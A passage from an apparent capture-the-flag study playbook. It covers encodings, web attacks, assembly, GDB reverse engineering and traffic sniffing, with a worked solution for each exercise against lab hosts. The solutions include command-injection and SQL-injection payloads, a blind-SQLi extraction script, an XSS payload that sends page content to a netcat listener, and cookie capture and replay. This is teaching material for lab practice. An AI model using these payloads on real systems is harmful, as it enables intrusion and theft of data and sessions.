echo -e -n '\x832\xdb\xc4\xc5\xd0\xaa\x8a' | base64
# Output: gzLbxMXQqoo=

# Supply encoding
echo -n 'gzLbxMXQqoo=' > /tmp/input
/challenge/runme < /tmp/input
```
</details>

---

## 📖 4.4 Nested Encoding

Sometimes input is encoded N times.

```python
# To create input:
# x = correct.hex().encode().hex().encode().hex()...
```

### 🏋️ Practice 1: 4-level hex

<details>
<summary>💡 Solution</summary>

```python
a = b'pkukrtnj'
h = a.hex().encode().hex().encode().hex().encode().hex()
print(h)
```
</details>

---

## 📖 4.5 UTF-8 / UTF-16

- **UTF-8**: variable-width (1-4 bytes per char)
- **UTF-16**: 2 bytes per char (little-endian on x86)

### 🏋️ Practice 1: Emoji encoding

**Task:** Encode `📊 🚔 🔦 🕞` in UTF-8.

<details>
<summary>💡 Solution</summary>

```python
correct = "📊 🚔 🔦 🕞".encode("utf-8")
print(correct)
# b'\xf0\x9f\x93\x8a \xf0\x9f\x9a\x94 \xf0\x9f\x94\xa6 \xf0\x9f\x95\x9e'
# Note spaces are 0x20
```
Then:
```bash
echo -n 'f09f938a20f09f9a9420f09f94a620f09f959e' > input
/challenge/runme < input
```
</details>

### 🏋️ Practice 2: UTF-16 trick

**Task:** String `mpseczuv` in UTF-16 (2 bytes per char, LE).

<details>
<summary>💡 Solution</summary>

```bash
# UTF-16 LE: each char followed by 0x00
echo -e -n '\x6d\x00\x70\x00\x73\x00\x65\x00\x63\x00\x7a\x00\x75\x00\x76\x00' > input
/challenge/runme < input
```
</details>

---

## 📖 4.6 Modifying Encoded Data

Sometimes the program reverses or transforms input. Read the code carefully.

### 🏋️ Practice 1: Reversed hex

**Task:** Program reverses the hex string before decoding.

<details>
<summary>💡 Solution</summary>

```python
original = b'\xdcr\x9dn\x14W\xab\xbe'
hex_str = original.hex()       # 'dc729d6e1457abbe'
reversed_hex = hex_str[::-1]   # 'ebba7541e6d927cd'
```
```bash
echo -n 'ebba7541e6d927cd' | /challenge/runme
```
</details>

---

## 📖 4.7 Obfuscation

Programs may use obfuscated code (variable renaming, string tricks). Read carefully.

### 🏋️ Practice 1: Dump the expected value

<details>
<summary>💡 Solution</summary>

```bash
# Copy the program to a test file
cp /challenge/runme test.py

# Edit test.py to print correct_password
# Then run it and use the output
python3 test.py
echo -n "output_from_program" > /tmp/input
/challenge/runme
```
</details>

---

# 🛡️ Module 5: Web Security

## 🎯 Learning Goals
- Path traversal
- Command injection (basic and blind)
- Authentication bypass
- SQL injection (UNION and blind)
- XSS (Stored, Reflected, Cookie theft)

---

## 📖 5.1 Path Traversal

When a program builds paths from user input:

```python
path = base_dir + "/" + user_input
open(path).read()
```

Escape with `../`:

```
base_dir/files/../../../flag → /flag
```

### 🏋️ Practice 1: Read the flag

<details>
<summary>💡 Solution</summary>

```bash
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"
```
- `--path-as-is` prevents curl from normalizing `../`
</details>

---

## 📖 5.2 Command Injection

When a program builds shell commands:

```python
command = f"ls -l {user_input}"
subprocess.run(command, shell=True)
```

Inject with `;`, `&&`, `|`, etc.

### 🏋️ Practice 1: Basic injection

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/checkpoint?target=;cat%20/flag"
```
</details>

### 🏋️ Practice 2: Bypass `;` filter

**Task:** `;` is filtered out — use `&&` instead.

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/puzzle?folder=/challenge%26%26cat%20/flag"
```
- `%26%26` = `&&`
</details>

### 🏋️ Practice 3: Blind injection (time-based)

<details>
<summary>💡 Solution</summary>

```bash
time curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20sleep%205"
```
If it sleeps 5 seconds, injection works.
</details>

---

## 📖 5.3 Authentication Bypass

When the server trusts client data:

```python
username = request.args.get("session_user")
if username == "admin":
    show_flag()
```

### 🏋️ Practice 1: URL parameter

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/?session_user=admin"
```
</details>

### 🏋️ Practice 2: Cookie

<details>
<summary>💡 Solution</summary>

```bash
curl -b "session_user=admin" "http://challenge.localhost:80/"
```
</details>

---

## 📖 5.4 SQL Injection

When SQL is built with f-strings:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Break out with `'` and use SQL comments `--`.

### 🏋️ Practice 1: Login bypass

<details>
<summary>💡 Solution</summary>

```bash
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' --" \
  -d "security-token=anything"
```
- `--` comments out the password check
</details>

### 🏋️ Practice 2: UNION injection

<details>
<summary>💡 Solution</summary>

```bash
# Get admin's password
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT password FROM users WHERE username="admin" --'

# Get all tables
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT name FROM sqlite_master WHERE type="table" --'
```
</details>

### 🏋️ Practice 3: Blind injection

<details>
<summary>💡 Solution</summary>

```bash
# Test if injection works
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR 1=1 --" \
  -v 2>&1 | grep "302"

# Extract char by char
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'p' --" \
  -v 2>&1 | grep "302"
```
</details>

### 🏋️ Practice 4: Full blind extraction script

<details>
<summary>💡 Solution</summary>

```python
import requests

def get_flag():
    base = "http://challenge.localhost:80/"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
    flag = ""
    pos = 1
    
    while True:
        for c in chars + "}":
            payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') = '{c}' --"
            r = requests.post(base,
                data={"username": "admin", "password": payload},
                allow_redirects=False
            )
            if r.status_code == 302:
                flag += c
                print(f"Found: {flag}")
                if c == '}':
                    return flag
                break
        pos += 1

print(f"Flag: {get_flag()}")
```
</details>

---

## 📖 5.5 XSS (Cross-Site Scripting)

When user input is inserted into HTML:

```python
page += "<hr>" + post["content"] + "\n"
```

Inject `<script>`.

### 🏋️ Practice 1: Basic XSS

<details>
<summary>💡 Solution</summary>

```bash
curl -X POST "http://challenge.localhost:80/" \
  -d 'content="><script>alert(1)</script>'
/challenge/victim "http://challenge.localhost:80/"
```
</details>

### 🏋️ Practice 2: Break out of textarea

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/?msg=</textarea><script>alert('PWNED')</script>"
```
</details>

### 🏋️ Practice 3: Steal cookie via XSS

<details>
<summary>💡 Solution</summary>

```bash
# Terminal 1: listener
nc -l -v -p 1337

# Terminal 2: post payload
curl -b cookie.txt -X POST "http://challenge.localhost:80/draft" \
  -d 'content=<script>fetch("/").then(r=>r.text()).then(html=>{fetch("http://localhost:1337/",{method:"POST",body:html});});</script>&publish=on'

/challenge/victim
```
</details>

---

# ⚙️ Module 6: Assembly & Systems

## 🎯 Learning Goals
- Registers and syscalls
- Load/store memory
- Stack operations
- Control flow
- Build a concurrent web server

---

## 📖 6.1 Your First Program

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rdi, 42      # exit code
    mov rax, 60      # exit syscall
    syscall
```

**Syscall convention:**

| Register | Purpose |
|----------|---------|
| `rax` | Syscall number |
| `rdi` | 1st argument |
| `rsi` | 2nd argument |
| `rdx` | 3rd argument |
| `r10` | 4th argument |

### 🏋️ Practice 1: Set exit code

**Task:** Exit with 0x1337.

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rdi, 0x1337
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 2: Multiple registers

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rax, 0x1337
    mov r12, 0xCAFED00D1337BEEF
    mov rsp, 0x31337
    mov rax, 60
    syscall
```
</details>

---

## 📖 6.2 Memory

```assembly
mov rax, [rdi]      # load 8 bytes from address in rdi
mov rax, [rdi+8]    # offset 8
mov [rsi], rax      # store 8 bytes to address in rsi
```

### 🏋️ Practice 1: Load from memory

**Task:** Load `[133700]` into `rdi`.

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rdi, [133700]
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 2: Memory sum

**Task:** Sum two consecutive qwords and store at `[rsi]`.

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rax, [rdi]
    add rax, [rdi+8]
    mov [rsi], rax
    mov rax, 60
    syscall
```
</details>

---

## 📖 6.3 The Stack

```assembly
push rax    # write rax to stack, decrement rsp by 8
pop rax     # read from stack, increment rsp by 8
```

### 🏋️ Practice 1: Stack subtraction

**Task:** Subtract `rdi` from top of stack.

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    pop rax
    sub rax, rdi
    push rax
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 2: Stack swap

**Task:** Swap `rdi` and `rsi` using the stack.

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    push rdi
    push rsi
    pop rdi
    pop rsi
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 3: Average 4 stack values

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rax, [rsp]
    add rax, [rsp+8]
    add rax, [rsp+16]
    add rax, [rsp+24]
    xor rdx, rdx
    mov rbx, 4
    div rbx
    push rax
    mov rax, 60
    syscall
```
</details>

---

## 📖 6.4 Input/Output

```assembly
# write(1, buf, count)
mov rdi, 1
mov rsi, buf
mov rdx, count
mov rax, 1
syscall

# read(0, buf, count)
mov rdi, 0
mov rsi, buf
mov rdx, count
mov rax, 0
syscall
```

### 🏋️ Practice 1: Read and echo

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 128
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 128
    mov rax, 1
    syscall

    mov rdi, 42
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 2: Open `/flag`

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov byte ptr [rsp], '/'
    mov byte ptr [rsp+1], 'f'
    mov byte ptr [rsp+2], 'l'
    mov byte ptr [rsp+3], 'a'
    mov byte ptr [rsp+4], 'g'
    mov byte ptr [rsp+5], 0

    mov rdi, rsp
    mov rsi, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 1024
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

    mov rdi, 42
    mov rax, 60
    syscall
```
</details>

---

## 📖 6.5 Control Flow

```assembly
cmp rax, rbx     # compare
je label         # jump if equal
jne label        # jump if not equal
jg label         # jump if greater
jl label         # jump if less
jmp label        # unconditional
```

### 🏋️ Practice 1: Relative jump

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    jmp target
    .rept 0x4F
    nop
    .endr
target:
    mov rax, 1
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 2: Conditional jump

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    mov eax, [rdi]
    cmp eax, 0x7f454c46
    je case1
    cmp eax, 0x5a4d
    je case2

    mov eax, [rdi+4]
    imul eax, [rdi+8]
    imul eax, [rdi+12]
    jmp done

case1:
    mov eax, [rdi+4]
    add eax, [rdi+8]
    add eax, [rdi+12]
    jmp done

case2:
    mov eax, [rdi+4]
    sub eax, [rdi+8]
    sub eax, [rdi+12]

done:
    mov rax, 60
    syscall
```
</details>

### 🏋️ Practice 3: For loop

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    xor rax, rax
    xor rcx, rcx
loop:
    cmp rcx, rsi
    jge done
    add rax, [rdi + rcx*8]
    inc rcx
    jmp loop
done:
    xor rdx, rdx
    div rsi
    mov rax, 60
    syscall
```
</details>

---

## 📖 6.6 Web Server (Assembly)

### Syscall Sequence

```assembly
# 1. socket(AF_INET, SOCK_STREAM, 0)
mov rdi, 2
mov rsi, 1
mov rdx, 0
mov rax, 41
syscall

# 2. bind(fd, &sockaddr, 16)
sub rsp, 16
mov word ptr [rsp], 2
mov word ptr [rsp+2], 0x5000    # port 80
mov rdi, sockfd
mov rsi, rsp
mov rdx, 16
mov rax, 49
syscall

# 3. listen(fd, 0)
mov rdi, sockfd
mov rsi, 0
mov rax, 50
syscall

# 4. accept(fd, NULL, NULL)
mov rdi, sockfd
xor esi, esi
xor edx, edx
mov rax, 43
syscall
mov r13, rax                    # client fd

# 5. write(client_fd, response, 19)
mov rdi, r13
lea rsi, [rip + response]
mov rdx, 19
mov rax, 1
syscall
```

### 🏋️ Practice 1: Static response

<details>
<summary>💡 Solution</summary>

```assembly
.intel_syntax noprefix
.global _start
_start:
    # socket
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    mov r12, rax

    # bind
    sub rsp, 16
    mov word ptr [rsp], 2
    mov word ptr [rsp+2], 0x5000
    mov dword ptr [rsp+4], 0
    mov qword ptr [rsp+8], 0
    mov rdi, r12
    mov rsi, rsp
    mov rdx, 16
    mov rax, 49
    syscall

    # listen
    mov rdi, r12
    mov rsi, 0
    mov rax, 50
    syscall

    # accept
    mov rdi, r12
    xor esi, esi
    xor edx, edx
    mov rax, 43
    syscall
    mov r13, rax

    # write response
    mov rdi, r13
    lea rsi, [rip + response]
    mov rdx, 19
    mov rax, 1
    syscall

    # close
    mov rdi, r13
    mov rax, 3
    syscall

    mov rax, 60
    syscall

response:
    .ascii "HTTP/1.0 200 OK\r\n\r\n"
```
</details>

### 🏋️ Practice 2: Concurrent server (fork)

<details>
<summary>💡 Solution</summary>

```assembly
accept_loop:
    mov rdi, r12
    xor esi, esi
    xor edx, edx
    mov rax, 43
    syscall
    mov r13, rax

    mov rax, 57         # fork
    syscall
    test rax, rax
    jz child

    # parent: close client, loop
    mov rdi, r13
    mov rax, 3
    syscall
    jmp accept_loop

child:
    # close listening socket
    mov rdi, r12
    mov rax, 3
    syscall

    # handle request
    # ...

    xor edi, edi
    mov rax, 60
    syscall
```
</details>

---

# 🔍 Module 7: Reverse Engineering

## 🎯 Learning Goals
- Static analysis with disassembly
- Dynamic analysis with GDB
- Reconstruct file formats (cIMG)
- Extract data from binaries
- Optimize data with rectangle packing

---

## 📖 7.1 Magic Numbers

File formats start with a "magic number" that identifies them.

### 🏋️ Practice 1: Find the magic in Python

**Task:** The Python script checks `header[:4] == b"(onr"`.

<details>
<summary>💡 Solution</summary>

```bash
python3 -c "open('magic.cimg','wb').write(b'(onr')"
/challenge/cimg magic.cimg
```
</details>

### 🏋️ Practice 2: Find the magic in x86

**Task:** The C code checks `magic_number == 1919831931`.

<details>
<summary>💡 Solution</summary>

`1919831931` in hex = `0x726E4F7B`.  
Little-endian bytes = `7B 4F 6E 72` = `{Onr`

```bash
python3 -c "open('magic.cimg','wb').write(b'{Onr')"
/challenge/cimg magic.cimg
```
</details>

---

## 📖 7.2 cIMG v1

```c
struct cimg_header {
    char magic_number[4];   // "cIMG"
    uint16_t version;       // 1
} __attribute__((packed));
```

### 🏋️ Practice 1: Create v1 file

<details>
<summary>💡 Solution</summary>

```bash
python3 -c "open('v1.cimg','wb').write(b'cIMG'+(1).to_bytes(2,'little'))"
/challenge/cimg v1.cimg
```
</details>

---

## 📖 7.3 cIMG v2

```c
struct cimg_header {
    char magic_number[4];
    uint16_t version;       // 2
    uint8_t width;
    uint8_t height;
} __attribute__((packed));
```

Pixels are 4 bytes: `(r, g, b, ascii)`.

### 🏋️ Practice 1: Extract and build

<details>
<summary>💡 Solution</summary>

```python
import subprocess, re, struct

BINARY = "/challenge/cimg"
WIDTH, HEIGHT = 91, 15
PIXELS = WIDTH * HEIGHT

# Extract desired_output
out = subprocess.check_output(["gdb","-batch","-ex","p/x &desired_output",BINARY]).decode()
addr = int(re.search(r'\$1 = (0x[0-9a-fA-F]+)', out).group(1), 16)
size = PIXELS * 24
subprocess.check_call(["gdb","-batch","-ex",f"dump binary memory /tmp/desired.bin {hex(addr)} {hex(addr+size)}",BINARY])
raw = open("/tmp/desired.bin","rb").read()

# Parse pixels
pixels = []
for i in range(0, len(raw), 24):
    blk = raw[i:i+24]
    r = int(blk[7:10]); g = int(blk[11:14]); b = int(blk[15:18]); c = blk[19]
    pixels.append((r,g,b,c))

# Build file
header = b"cIMG" + (2).to_bytes(2,"little") + bytes([WIDTH, HEIGHT])
body = b"".join(bytes(p) for p in pixels)
open("v2.cimg","wb").write(header + body)
print("Wrote v2.cimg")
```
</details>

---

## 📖 7.4 cIMG v3 (Directives)

```c
case 43709:   // 0xAABD
    // reads x, y, w, h (1 byte each)
    // then w*h*4 bytes of pixel data
    // patches that rectangle at (x, y)
```

### 🏋️ Practice 1: Single patch

<details>
<summary>💡 Solution</summary>

```python
import struct

# Read desired_output as 4-byte pixels
# ...

# Build one patch directive covering the full image
body = struct.pack("<H", 43709) + bytes([0, 0, 91, 15])
for p in pixels:
    body += bytes(p)

header = b"cIMG" + (3).to_bytes(2,"little") + bytes([91, 15]) + (1).to_bytes(4,"little")
open("v3.cimg","wb").write(header + body)
```
</details>

### 🏋️ Practice 2: Optimize for space

**Task:** Fit the image into ≤ 1337 bytes using multiple rectangles.

<details>
<summary>💡 Solution</summary>

```python
#!/usr/bin/env python3
import subprocess, re, struct

BINARY = "/challenge/cimg"
OUTPUT = "solution.cimg"
TOTAL_PIXELS = 1365
PATCH_CODE = 52965   # or 43709

# 1. Extract desired_output
out = subprocess.check_output(["gdb","-batch","-ex","p/x &desired_output",BINARY]).decode()
addr = int(re.search(r'\$1 = (0x[0-9a-fA-F]+)', out).group(1), 16)
size = TOTAL_PIXELS * 24
subprocess.check_call(["gdb","-batch","-ex",f"dump binary memory /tmp/desired.bin {hex(addr)} {hex(addr+size)}",BINARY])
raw = open("/tmp/desired.bin","rb").read()
linear = []
for i in range(0, len(raw), 24):
    blk = raw[i:i+24]
    r = int(blk[7:10]); g = int(blk[11:14]); b = int(blk[15:18]); c = blk[19]
    linear.append((r,g,b,c))

# 2. Largest rectangle in histogram
def largest_rect(covered, img, W, H):
    best = None; best_area = 0
    heights = [0]*W
    for y in range(H):
        for x in range(W):
            if covered[y][x] or img[y][x][3] == ord(' '):
                heights[x] = 0
            else:
                heights[x] += 1
        stack = []
        for x in range(W+1):
            h = heights[x] if x < W else 0
            start = x
            while stack and stack[-1][1] > h:
                sx, sh = stack.pop()
                area = sh * (x - sx)
                if area > best_area:
                    best_area = area
                    best = (sx, y - sh + 1, x - sx, sh)
                start = sx
            stack.append((start, h))
    return best

def pack_image(img, W, H):
    covered = [[False]*W for _ in range(H)]
    rects = []
    while True:
        r = largest_rect(covered, img, W, H)
        if r is None: break
        x, y, w, h = r
        for yy in range(y, y+h):
            for xx in range(x, x+w):
                covered[yy][xx] = True
        rects.append(r)
    return rects

# 3. Try every shape
best = None; best_size = 10**9
for w in range(1, 256):
    if TOTAL_PIXELS % w: continue
    h = TOTAL_PIXELS // w
    if h > 255: continue
    img = [linear[i*w:(i+1)*w] for i in range(h)]
    rects = pack_image(img, w, h)
    body_size = sum(6 + 4*r[2]*r[3] for r in rects)
    total_read = 12 + body_size
    if total_read < best_size:
        best_size = total_read
        best = (w, h, rects)

# 4. Write file
w, h, rects = best
img = [linear[i*w:(i+1)*w] for i in range(h)]
body = b""
for x, y, ww, hh in rects:
    body += struct.pack("<H", PATCH_CODE)
    body += bytes([x, y, ww, hh])
    for yy in range(y, y+hh):
        for xx in range(x, x+ww):
            body += bytes(img[yy][xx])

header = b"cIMG" + (3).to_bytes(2,"little") + bytes([w,h]) + len(rects).to_bytes(4,"little")
open(OUTPUT,"wb").write(header + body)
print(f"Wrote {OUTPUT}: total read {best_size}")
```
</details>

---

## 📖 7.5 GDB Scripting

### 🏋️ Practice 1: Print random values

<details>
<summary>💡 Solution</summary>

```gdb
set disassembly-flavor intel
set pagination off
set confirm off
handle SIGTRAP nostop noprint pass

start

break *main+798
commands
  silent
  set $var = *(unsigned long long*)($rbp-0x18)
  printf "Random Value: 0x%016llx\n", $var
  continue
end

continue
```
</details>

### 🏋️ Practice 2: Modify memory

<details>
<summary>💡 Solution</summary>

```gdb
set disassembly-flavor intel
set pagination off
set confirm off

start

break *main+575
commands
  silent
  set *(int*)($rbp-0x1c) = 0x40
  continue
end

continue
```
</details>

### 🏋️ Practice 3: Jump to `win()`

<details>
<summary>💡 Solution</summary>

```gdb
set disassembly-flavor intel
set pagination off
set confirm off

start

break *main+333
commands
  silent
  call (void) win()
  quit
end

continue
```
</details>

### 🏋️ Practice 4: Fix broken `win()`

<details>
<summary>💡 Solution</summary>

```gdb
set disassembly-flavor intel
set pagination off
set confirm off

start

break *win+20
commands
  silent
  set *(unsigned long long*)($rbp-0x8) = $rbp
  continue
end

break *main+333
commands
  silent
  set $rip = win
  continue
end

continue
```
</details>

---

# 📡 Module 8: Intercepting Communication

## 🎯 Learning Goals
- Capture network traffic with `tshark`
- Extract HTTP data (cookies, flags)
- Understand why HTTPS matters
- Use stolen cookies

---

## 📖 8.1 Ping Sweep (Find Hosts)

### 🏋️ Practice 1: Parallel ping sweep

<details>
<summary>💡 Solution</summary>

```python
import subprocess
from concurrent.futures import ThreadPoolExecutor

def is_up(ip):
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", "-n", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2
        )
        return result.returncode == 0
    except Exception:
        return False

def main():
    subnet = sys.argv[1]
    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    print(f"[*] Pinging {subnet}.1 - {subnet}.254 ...")
    live = []
    with ThreadPoolExecutor(max_workers=64) as pool:
        for ip, up in zip(ips, pool.map(is_up, ips)):
            if up:
                print(f"[+] {ip} is UP")
                live.append(ip)
    print(f"[*] Done. {len(live)} host(s) alive.")
```
</details>

### 🏋️ Practice 2: Use nmap

<details>
<summary>💡 Solution</summary>

```bash
# Ping scan
nmap -sn 10.0.0.0/16

# If ICMP blocked, use TCP SYN ping
nmap -sn -PS80 10.0.0.0/16
```
</details>

---

## 📖 8.2 Capture HTTP Traffic (tshark)

Wireshark is GUI-only. Use `tshark` (CLI) instead.

### 🏋️ Practice 1: Capture port 80

<details>
<summary>💡 Solution</summary>

```bash
tshark -i eth0 -f "tcp port 80" -w /tmp/http.pcap
```
- `-i eth0`: interface
- `-f "tcp port 80"`: BPF filter
- `-w`: write to file
</details>

### 🏋️ Practice 2: Extract cookies

<details>
<summary>💡 Solution</summary>

```bash
# Client-sent cookies (request header)
tshark -r /tmp/http.pcap -Y "http.cookie" -T fields -e http.cookie

# Server-set cookies (response header)
tshark -r /tmp/http.pcap -Y "http.set_cookie" -T fields -e http.set_cookie
```
</details>

### 🏋️ Practice 3: Follow HTTP stream

<details>
<summary>💡 Solution</summary>

```bash
# List streams
tshark -r /tmp/http.pcap -T fields -e tcp.stream | sort -u

# Dump stream as text
tshark -r /tmp/http.pcap -q -z follow,tcp,ascii,0
```
</details>

### 🏋️ Practice 4: Extract payload (flag in TCP data)

<details>
<summary>💡 Solution</summary>

```bash
# Print payload as hex
tshark -i eth0 -f "tcp port 31337" -T fields -e tcp.payload -Y "tcp.len > 0"

# Decode hex to text
tshark -r /tmp/cap.pcap -T fields -e tcp.payload -Y "tcp.len > 0" | xxd -r -p
```
</details>

---

## 📖 8.3 Use Stolen Cookie

### 🏋️ Practice 1: Use with curl

<details>
<summary>💡 Solution</summary>

```bash
curl --cookie "session=eyJ1c2VyIjoiYWRtaW4ifQ..." http://10.0.0.2/flag
```
</details>

### 🏋️ Practice 2: Save cookie to file

<details>
<summary>💡 Solution</summary>

```bash
cat > cookies.txt << 'EOF'
10.0.0.2	FALSE	/	FALSE	0	session	eyJ1c2VyIjoiYWRtaW4ifQ...
EOF
curl -b cookies.txt http://10.0.0.2/flag
```
</details>

---

## 📖 8.4 Why HTTPS Matters

- **HTTP** = plaintext (anyone can read)
- **HTTPS** = encrypted (needs key or MITM)

If the challenge uses HTTP, you can read everything. If HTTPS, you need:
- **SSLKEYLOGFILE** (if you control the client)
- A **proxy** (mitmproxy, Burp)
- A **certificate** trusted by the client

---

# 🧠 Learning Path Summary

## Recommended Order

```
Week 1: Module 1 (Linux) + Module 2 (SQL)
Week 2: Module 3 (HTTP) + Module 4 (Encodings)
Week 3: Module 5 (Web Security)
Week 4: Module 6 (Assembly)
Week 5: Module 7 (Reverse Engineering)
Week 6: Module 8 (Network Interception)
```

## Key Skills by Module

| Module | Skills You'll Gain |
|--------|-------------------|
| **1. Linux** | Navigate, pipe, permissions, PATH, scripts, screen/tmux, .bashrc attacks, symlink attacks, fork bomb, disk exhaustion |
| **2. SQL** | SELECT, WHERE, SUBSTR, sqlite_master |
| **3. HTTP** | curl, netcat, headers, cookies, forms, JavaScript |
| **4. Encodings** | hex, base64, UTF-8/16, nested encoding |
| **5. Web Sec** | Path traversal, command injection, auth bypass, SQLi, XSS |
| **6. Assembly** | Registers, syscalls, stack, control flow, web server |
| **7. Reverse Eng** | GDB, disassembly, file formats, patching, optimization |
| **8. Network** | Ping sweep, tshark, cookie theft |

## Practice Checklist

- [ ] Module 1: All 108 Linux Luminarium challenges
- [ ] Module 2: All SQL challenges
- [ ] Module 3: All HTTP challenges
- [ ] Module 4: All encoding challenges
- [ ] Module 5: All web security challenges
- [ ] Module 6: All assembly challenges
- [ ] Module 7: All reverse engineering challenges
- [ ] Module 8: All network challenges

---

## 🎓 Final Tips

1. **Read the source code** — almost every challenge gives you a Python or C file. Read it before attacking.
2. **Use GDB** — for binary challenges, `disassemble` and `stepi` are essential.
3. **Write scripts** — Python automates repetitive tasks (extraction, brute force, packing).
4. **Understand the vulnerability** — don't just copy payloads; understand why they work.
5. **Practice each module** — don't move on until you can solve the challenges yourself.
6. **Take notes** — write down the pattern of each challenge type.
7. **Use `--help` and `man`** — understand your tools.
8. **Terminal multiplexers are your friend** — `screen` and `tmux` save your work.

---

**Happy hacking! 🚀**

*This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.*
